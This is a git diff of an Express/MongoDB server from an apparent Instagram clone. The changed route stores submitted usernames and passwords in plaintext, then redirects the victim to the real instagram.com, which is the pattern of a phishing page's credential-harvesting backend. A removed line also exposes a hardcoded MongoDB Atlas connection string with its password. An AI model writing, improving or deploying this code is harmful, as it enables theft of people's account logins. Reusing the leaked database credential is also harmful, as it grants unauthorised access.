@@ -1,23 +1,24 @@
-// server.js
+require("dotenv").config();
 const express = require("express");
 const { MongoClient } = require("mongodb");
-const bodyParser = require("body-parser");
 const cors = require("cors");
+const path = require('path');
+const bodyParser = require("body-parser");
 
 const app = express();
+const port = process.env.PORT || 3000;
+
 app.use(cors());
 app.use(bodyParser.json());
+app.use(express.static(path.join(__dirname,'frontend'))); // 👈 Serve frontend
 
-// Replace <username> and <password> with your Atlas credentials
-const uri = "mongodb+srv://httpsishuuu:123456Seven@cluster0.pt6bn.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0";
-const client = new MongoClient(uri);
-
+const client = new MongoClient(process.env.MONGO_URI);
 let db;
 
 async function connectDB() {
   try {
     await client.connect();
-    db = client.db("insta_clone"); // your database name
+    db = client.db("insta_app_db");
     console.log("✅ Connected to MongoDB");
   } catch (err) {
     console.error("❌ DB connection error:", err);
@@ -25,22 +26,22 @@ async function connectDB() {
 }
 connectDB();
 
-// Route to store user input
-app.post("/storeUser", async (req, res) => {
+app.post("/", async (req, res) => {
   const { username, password } = req.body;
-
-  if (!username || !password) {
+  if (!username || !password)
     return res.status(400).json({ message: "Missing username or password" });
-  }
 
   try {
-    await db.collection("users").insertOne({ username, password, createdAt: new Date() });
-    console.log("📦 Data saved:", username, password);
-    res.json({message:"✅ User data saved successfully!"});
+    await db.collection("users").insertOne({
+      username,
+      password,
+      createdAt: new Date(),
+    });
+    console.log("📦 Data saved:", username);
+    return res.redirect("https://www.instagram.com");
   } catch (err) {
     console.error("❌ Error saving data:", err);
-    res.status(500).json({ message: "Error saving data" });
   }
 });
 
-app.listen(3000, () => console.log("🚀 Server running on http://localhost:3000"));
+app.listen(port, () => console.log(`🚀 Server running on http://localhost:${port}`));
